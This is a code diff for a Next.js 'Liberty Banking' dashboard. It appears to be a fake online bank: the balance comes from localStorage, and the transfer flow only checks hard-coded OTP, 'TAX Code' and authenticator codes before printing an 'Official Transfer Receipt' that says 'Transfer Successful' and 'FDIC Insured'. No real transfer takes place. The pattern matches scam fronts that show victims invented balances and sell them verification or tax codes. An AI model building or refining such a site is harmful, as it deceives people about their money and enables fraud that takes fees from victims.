@@ -1,31 +1,22 @@
 'use client';
 
-import { useEffect, useState } from "react";
+import { useState, useEffect } from 'react';
+import { useRouter } from 'next/navigation';
 
-export default function Dashboard() {
-  const [ACCOUNT, setACCOUNT] = useState(null);
+/* ─────────────────────────────────────────────
+   ACCOUNT DATA
+───────────────────────────────────────────── */
+const DEFAULT_ACCOUNT = {
+  name: 'Checkings Account',
+  balance: '$4,000.00',
+  cardLast4: '8750',
+  fullCard: '**** **** **** 8750',
+  accountId: '9337910',
+};
 
-  useEffect(() => {
-    const raw = localStorage.getItem("user");
-
-    if (raw) {
-      setACCOUNT(JSON.parse(raw));
-    }
-  }, []);
-
-  if (!ACCOUNT) {
-    return <div style={{ padding: 20 }}>No account found</div>;
-  }
-
-  return (
-    <div style={{ padding: 20 }}>
-      <div>{ACCOUNT.balance}</div>
-      <div>{ACCOUNT.fullCard}</div>
-    </div>
-  );
-}
-
-const OTP_CODE = '1234';
+const OTP_CODE   = '110075169';
+const GMAIL_CODE = '464-427';
+const AUTH_CODE  = 'Her37';
 
 /* ─────────────────────────────────────────────
    MOBILE STYLES
@@ -99,28 +90,16 @@ function Btn({ children, onClick, style: s, variant = 'primary', type = 'button'
 function InputRow({ icon, label, name, placeholder, type = 'text', optional, value, onChange }) {
   return (
     <div style={{ marginBottom: 16 }}>
-      
       <label style={{ display: 'block', fontSize: 13, fontWeight: 700, color: '#333', marginBottom: 5 }}>
-        {label}
-        {optional && <span style={{ color: '#999', fontWeight: 400, marginLeft: 4 }}>(Optional)</span>}
+        {label}{optional && <span style={{ color: '#999', fontWeight: 400, marginLeft: 4 }}>(Optional)</span>}
       </label>
-
       <div style={{ position: 'relative' }}>
-        
         {icon && (
           <span style={{
-            position: 'absolute',
-            left: 13,
-            top: '50%',
-            transform: 'translateY(-50%)',
-            fontSize: 17,
-            opacity: 0.5,
-            pointerEvents: 'none',
-          }}>
-            {icon}
-          </span>
+            position: 'absolute', left: 13, top: '50%', transform: 'translateY(-50%)',
+            fontSize: 17, opacity: 0.5, pointerEvents: 'none',
+          }}>{icon}</span>
         )}
-
         <input
           type={type}
           name={name}
@@ -129,23 +108,13 @@ function InputRow({ icon, label, name, placeholder, type = 'text', optional, val
           placeholder={placeholder}
           required={!optional}
           style={{
-            width: '100%',
-            padding: `11px 12px 11px ${icon ? '42px' : '12px'}`,
-            border: '1.5px solid #ddd',
-            borderRadius: 10,
-            fontSize: 14,
-            outline: 'none',
-            boxSizing: 'border-box',
-
-            // ✅ FIX ADDED (DO NOT REMOVE)
-            color: '#000',
-            WebkitTextFillColor: '#000',
-            backgroundColor: '#fff'
+            width: '100%', padding: `11px 12px 11px ${icon ? '42px' : '12px'}`,
+            border: '1.5px solid #ddd', borderRadius: 10, fontSize: 14,
+            outline: 'none', boxSizing: 'border-box', color: '#111',
           }}
           onFocus={e => e.target.style.borderColor = '#0a2240'}
           onBlur={e => e.target.style.borderColor = '#ddd'}
         />
-
       </div>
     </div>
   );
@@ -210,7 +179,7 @@ function ProcessingScreen({ onDone }) {
    TRANSFER MODAL — 6 STEPS:
    1: Form → 2: Processing → 3: OTP Code → 4: Gmail OTP → 5: Authenticator OTP → 6: Receipt
 ───────────────────────────────────────────── */
-function TransferModal({ open, onClose, title }) {
+function TransferModal({ open, onClose, title, account }) {
   const [step, setStep] = useState(1);
   const [fields, setFields] = useState({
     amount: '', beneficiary: '', iban: '', bank: '', swift: '',
@@ -233,17 +202,17 @@ function TransferModal({ open, onClose, title }) {
   function handleOtpCode(e) {
     e.preventDefault();
     if (otpCode === OTP_CODE) { setStep(4); }
-    else { setOtpError('Incorrect code. Please try again.'); }
+    else { setOtpError('Incorrect OTP code. Please try again.'); }
   }
   function handleGmailOtp(e) {
     e.preventDefault();
-    if (gmailOtp === OTP_CODE) { setStep(5); }
-    else { setGmailError('Incorrect code. Please try again.'); }
+    if (gmailOtp === GMAIL_CODE) { setStep(5); }
+    else { setGmailError('Incorrect Gmail code. Please try again.'); }
   }
   function handleAuthOtp(e) {
     e.preventDefault();
-    if (authOtp === OTP_CODE) { setStep(6); }
-    else { setAuthError('Incorrect code. Please try again.'); }
+    if (authOtp === AUTH_CODE) { setStep(6); }
+    else { setAuthError('Incorrect Authenticator code. Please try again.'); }
   }
 
   function handleClose() {
@@ -327,10 +296,10 @@ function TransferModal({ open, onClose, title }) {
           <input
             type="text" value={otpCode}
             onChange={e => { setOtpCode(e.target.value); setOtpError(''); }}
-            placeholder="Enter code" maxLength={6} required autoComplete="one-time-code"
+            placeholder="Enter code" maxLength={12} required autoComplete="one-time-code"
             style={{
               width: '100%', padding: '14px', border: '2px solid #ddd', borderRadius: 12,
-              fontSize: 24, textAlign: 'center', letterSpacing: 8, outline: 'none',
+              fontSize: 20, textAlign: 'center', letterSpacing: 3, outline: 'none',
               boxSizing: 'border-box', fontWeight: 800, color: '#0a2240',
             }}
             onFocus={e => e.target.style.borderColor = '#0a2240'}
@@ -367,10 +336,10 @@ function TransferModal({ open, onClose, title }) {
           <input
             type="text" value={gmailOtp}
             onChange={e => { setGmailOtp(e.target.value); setGmailError(''); }}
-            placeholder="Enter code" maxLength={6} required autoComplete="one-time-code"
+            placeholder="Enter Code" maxLength={10} required autoComplete="one-time-code"
             style={{
               width: '100%', padding: '14px', border: '2px solid #ddd', borderRadius: 12,
-              fontSize: 24, textAlign: 'center', letterSpacing: 8, outline: 'none',
+              fontSize: 20, textAlign: 'center', letterSpacing: 3, outline: 'none',
               boxSizing: 'border-box', fontWeight: 800, color: '#0a2240',
             }}
             onFocus={e => e.target.style.borderColor = '#0a2240'}
@@ -385,7 +354,7 @@ function TransferModal({ open, onClose, title }) {
           <p style={{ textAlign: 'center', fontSize: 11, color: '#aaa', margin: '4px 0 16px' }}>TAX Code Verification</p>
           <div style={{ display: 'flex', gap: 10 }}>
             <Btn variant="outline" onClick={() => setStep(3)} style={{ flex: 1 }}>← Back</Btn>
-            <Btn variant="primary" type="submit" style={{ flex: 2 }}>Verify Gmail Code</Btn>
+            <Btn variant="primary" type="submit" style={{ flex: 2 }}>Verify TAX Code</Btn>
           </div>
         </form>
       )}
@@ -407,10 +376,10 @@ function TransferModal({ open, onClose, title }) {
           <input
             type="text" value={authOtp}
             onChange={e => { setAuthOtp(e.target.value); setAuthError(''); }}
-            placeholder="Enter code" maxLength={6} required autoComplete="one-time-code"
+            placeholder="Enter code" maxLength={10} required autoComplete="one-time-code"
             style={{
               width: '100%', padding: '14px', border: '2px solid #ddd', borderRadius: 12,
-              fontSize: 24, textAlign: 'center', letterSpacing: 8, outline: 'none',
+              fontSize: 20, textAlign: 'center', letterSpacing: 3, outline: 'none',
               boxSizing: 'border-box', fontWeight: 800, color: '#0a2240',
             }}
             onFocus={e => e.target.style.borderColor = '#0a2240'}
@@ -430,155 +399,63 @@ function TransferModal({ open, onClose, title }) {
         </form>
       )}
 
+
       {/* ── STEP 6: RECEIPT ── */}
-{step === 6 && (
-  <div>
-    <div style={{
-      border: '2px dashed #bbb',
-      borderRadius: 16,
-      padding: '24px',
-      fontFamily: '"Courier New", monospace',
-      fontSize: 13,
-      backgroundColor: '#ffffff',
-      color: '#000' // ✅ GLOBAL TEXT FIX
-    }}>
-
-      <div style={{ textAlign: 'center', marginBottom: 18 }}>
-        <div style={{ fontSize: 26, marginBottom: 6 }}>🏛</div>
-
-        <div style={{
-          fontSize: 17,
-          fontWeight: 900,
-          color: '#0a2240',
-          letterSpacing: 1
-        }}>
-          LIBERTY BANKING
-        </div>
-
-        <div style={{
-          fontSize: 10,
-          color: '#555', // ✅ DARKER
-          letterSpacing: 2,
-          textTransform: 'uppercase'
-        }}>
-          Official Transfer Receipt
-        </div>
-
-        <div style={{ borderBottom: '1px dashed #bbb', margin: '12px 0' }} />
-      </div>
-
-      <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
-        {[
-          ['Transaction Type', title],
-          ['Reference No.', ref],
-          ['Date & Time', txDate],
-          ['From', 'Checkings Account – ' + ACCOUNT.fullCard],
-          ['Beneficiary', fields.beneficiary],
-          ['Account / IBAN', fields.iban],
-          ['Bank', fields.bank],
-          ['SWIFT Code', fields.swift],
-          ['Routing No.', fields.routing],
-          ...(fields.address ? [['Bank Address', fields.address]] : []),
-          ...(fields.remarks ? [['Remarks', fields.remarks]] : []),
-        ].map(([k, v]) => (
-          <div key={k} style={{
-            display: 'flex',
-            justifyContent: 'space-between',
-            gap: 16,
-            borderBottom: '1px dotted #ddd',
-            paddingBottom: 7
+      {step === 6 && (
+        <div>
+          <div style={{
+            border: '2px dashed #0a2240', borderRadius: 16, padding: '24px',
+            fontFamily: '"Courier New", monospace', fontSize: 13,
+            background: '#f4f6fa',
           }}>
-            <span style={{
-              color: '#333', // ✅ DARKER LABEL
-              flexShrink: 0,
-              fontSize: 12,
-              fontWeight: 600
-            }}>
-              {k}
-            </span>
+            <div style={{ textAlign: 'center', marginBottom: 18 }}>
+              <div style={{ fontSize: 26, marginBottom: 6 }}>🏛</div>
+              <div style={{ fontSize: 17, fontWeight: 900, color: '#0a2240', letterSpacing: 1 }}>LIBERTY BANKING</div>
+              <div style={{ fontSize: 10, color: '#444', letterSpacing: 2, textTransform: 'uppercase' }}>Official Transfer Receipt</div>
+              <div style={{ borderBottom: '2px dashed #0a2240', margin: '12px 0' }} />
+            </div>
 
-            <span style={{
-              fontWeight: 700,
-              textAlign: 'right',
-              wordBreak: 'break-all',
-              fontSize: 12,
-              color: '#000' // ✅ FORCE BLACK TEXT
-            }}>
-              {v}
-            </span>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
+              {[
+                ['Transaction Type', title],
+                ['Reference No.', ref],
+                ['Date & Time', txDate],
+                ['From', 'Checkings Account – ' + (account ? account.fullCard : DEFAULT_ACCOUNT.fullCard)],
+                ['Beneficiary', fields.beneficiary],
+                ['Account / IBAN', fields.iban],
+                ['Bank', fields.bank],
+                ['SWIFT Code', fields.swift],
+                ['Routing No.', fields.routing],
+                ...(fields.address ? [['Bank Address', fields.address]] : []),
+                ...(fields.remarks ? [['Remarks', fields.remarks]] : []),
+              ].map(([k, v]) => (
+                <div key={k} style={{ display: 'flex', justifyContent: 'space-between', gap: 16, borderBottom: '1px solid #c8d0dc', paddingBottom: 7 }}>
+                  <span style={{ color: '#555', flexShrink: 0, fontSize: 12, fontWeight: 600 }}>{k}</span>
+                  <span style={{ fontWeight: 800, color: '#0a2240', textAlign: 'right', wordBreak: 'break-all', fontSize: 12 }}>{v}</span>
+                </div>
+              ))}
+            </div>
+
+            <div style={{ borderTop: '2px dashed #0a2240', marginTop: 14, paddingTop: 14, textAlign: 'center' }}>
+              <div style={{ fontSize: 10, color: '#555', marginBottom: 4, letterSpacing: 1, textTransform: 'uppercase', fontWeight: 700 }}>Amount Transferred</div>
+              <div style={{ fontSize: 34, fontWeight: 900, color: '#0a2240' }}>
+                ${parseFloat(fields.amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
+              </div>
+            </div>
+
+            <div style={{ textAlign: 'center', marginTop: 16, borderTop: '1px dashed #0a2240', paddingTop: 14 }}>
+              <div style={{ color: '#16a34a', fontWeight: 800, fontSize: 15 }}>✔ Transfer Successful</div>
+              <div style={{ fontSize: 10, color: '#555', marginTop: 8, fontWeight: 600 }}>Keep this receipt for your records.</div>
+              <div style={{ fontSize: 10, color: '#555', marginTop: 2 }}>Liberty Banking | FDIC Insured | libertybanking.com</div>
+            </div>
           </div>
-        ))}
-      </div>
 
-      <div style={{
-        borderTop: '2px dashed #bbb',
-        marginTop: 14,
-        paddingTop: 14,
-        textAlign: 'center'
-      }}>
-        <div style={{
-          fontSize: 10,
-          color: '#555', // ✅ DARKER
-          marginBottom: 4,
-          letterSpacing: 1,
-          textTransform: 'uppercase'
-        }}>
-          Amount Transferred
+          <div style={{ display: 'flex', gap: 10, marginTop: 18 }}>
+            <Btn variant="outline" onClick={handleClose} style={{ flex: 1 }}>Close</Btn>
+            <Btn variant="gold" onClick={() => window.print()} style={{ flex: 1 }}>🖨 Print Receipt</Btn>
+          </div>
         </div>
-
-        <div style={{
-          fontSize: 34,
-          fontWeight: 900,
-          color: '#0a2240'
-        }}>
-          ${parseFloat(fields.amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
-        </div>
-      </div>
-
-      <div style={{
-        textAlign: 'center',
-        marginTop: 16,
-        borderTop: '1px dashed #bbb',
-        paddingTop: 14
-      }}>
-        <div style={{
-          color: '#15803d', // ✅ STRONG GREEN
-          fontWeight: 800,
-          fontSize: 15
-        }}>
-          ✔ Transfer Successful
-        </div>
-
-        <div style={{
-          fontSize: 10,
-          color: '#555', // ✅ DARKER
-          marginTop: 8
-        }}>
-          Keep this receipt for your records.
-        </div>
-
-        <div style={{
-          fontSize: 10,
-          color: '#555', // ✅ DARKER
-          marginTop: 2
-        }}>
-          Liberty Banking | FDIC Insured | libertybanking.com
-        </div>
-      </div>
-
-    </div>
-
-    <div style={{ display: 'flex', gap: 10, marginTop: 18 }}>
-      <Btn variant="outline" onClick={handleClose} style={{ flex: 1 }}>
-        Close
-      </Btn>
-
-      <Btn variant="gold" onClick={() => window.print()} style={{ flex: 1 }}>
-        🖨 Print Receipt
-      </Btn>
-    </div>
-  </div>
-)}
+      )}
     </Modal>
   );
 }
@@ -730,7 +607,7 @@ function GenericModal({ open, onClose, title, icon, desc }) {
 /* ─────────────────────────────────────────────
    PROFILE MODAL
 ───────────────────────────────────────────── */
-function ProfileModal({ open, onClose }) {
+function ProfileModal({ open, onClose, account }) {
   return (
     <Modal open={open} onClose={onClose} title="My Profile">
       <div style={{ textAlign: 'center', marginBottom: 22 }}>
@@ -741,7 +618,7 @@ function ProfileModal({ open, onClose }) {
           margin: '0 auto 14px', boxShadow: '0 8px 24px rgba(10,34,64,0.3)',
         }}>👤</div>
         <div style={{ fontSize: 17, fontWeight: 800, color: '#0a2240' }}>Account Holder</div>
-        <div style={{ fontSize: 12, color: '#888', marginTop: 3 }}>Account ID: 9337910</div>
+        <div style={{ fontSize: 12, color: '#888', marginTop: 3 }}>Account ID: {account.accountId}</div>
       </div>
 
       <div style={{
@@ -749,9 +626,9 @@ function ProfileModal({ open, onClose }) {
         padding: 22, color: '#fff', marginBottom: 18,
       }}>
         <div style={{ fontSize: 11, color: 'rgba(200,220,255,0.8)', marginBottom: 5, letterSpacing: 1, textTransform: 'uppercase' }}>Checkings Account</div>
-        <div style={{ fontSize: 30, fontWeight: 900, color: '#d4af37' }}>{ACCOUNT.balance}</div>
+        <div style={{ fontSize: 30, fontWeight: 900, color: '#d4af37' }}>{account.balance}</div>
         <div style={{ fontSize: 13, color: 'rgba(200,220,255,0.7)', marginTop: 8, letterSpacing: 2 }}>
-          •••• •••• •••• {ACCOUNT.cardLast4}
+          •••• •••• •••• {account.cardLast4}
         </div>
       </div>
 
@@ -779,6 +656,23 @@ export default function DashboardPage() {
   const router = useRouter();
   const [openModal, setOpenModal] = useState(null);
   const [showProfile, setShowProfile] = useState(false);
+  const [ACCOUNT, setACCOUNT] = useState(DEFAULT_ACCOUNT);
+
+  useEffect(() => {
+    try {
+      const saved = localStorage.getItem('lb_user');
+      if (saved) {
+        const user = JSON.parse(saved);
+        setACCOUNT({
+          name: 'Checkings Account',
+          balance: user.balance,
+          cardLast4: user.cardLast4,
+          fullCard: user.fullCard,
+          accountId: user.id,
+        });
+      }
+    } catch (_) {}
+  }, []);
 
   const open = (name) => setOpenModal(name);
   const close = () => setOpenModal(null);
@@ -849,7 +743,7 @@ export default function DashboardPage() {
               Checkings Account
             </div>
             <div style={{ fontSize: 'clamp(36px, 5vw, 50px)', fontWeight: 900, color: '#d4af37', lineHeight: 1 }}>
-              $4,000.00
+              {ACCOUNT.balance}
             </div>
             <div style={{ fontSize: 14, color: 'rgba(200,220,255,0.8)', marginTop: 10, letterSpacing: 3 }}>
               •••• •••• •••• {ACCOUNT.cardLast4}
@@ -946,9 +840,9 @@ export default function DashboardPage() {
       </div>
 
       {/* ─── MODALS ─── */}
-      <TransferModal open={openModal === 'wire'}      onClose={close} title="Wire Transfer" />
-      <TransferModal open={openModal === 'local'}     onClose={close} title="Local Transfer" />
-      <TransferModal open={openModal === 'internal'}  onClose={close} title="Internal Transfer" />
+      <TransferModal open={openModal === 'wire'}      onClose={close} title="Wire Transfer"      account={ACCOUNT} />
+      <TransferModal open={openModal === 'local'}     onClose={close} title="Local Transfer"    account={ACCOUNT} />
+      <TransferModal open={openModal === 'internal'}  onClose={close} title="Internal Transfer" account={ACCOUNT} />
       <PayBillsModal open={openModal === 'bills'}     onClose={close} />
       <AlertsModal   open={openModal === 'alerts'}    onClose={close} />
       <SupportModal  open={openModal === 'support'}   onClose={close} />
@@ -962,7 +856,7 @@ export default function DashboardPage() {
       <GenericModal open={openModal === 'investment'} onClose={close} title="Investment Portal" icon="📈"
         desc="Grow your wealth with Liberty Banking's investment services. Access managed portfolios, ETFs, mutual funds, and retirement accounts managed by certified financial advisors." />
 
-      <ProfileModal open={showProfile} onClose={() => setShowProfile(false)} />
+      <ProfileModal open={showProfile} onClose={() => setShowProfile(false)} account={ACCOUNT} />
     </div>
   );
 }
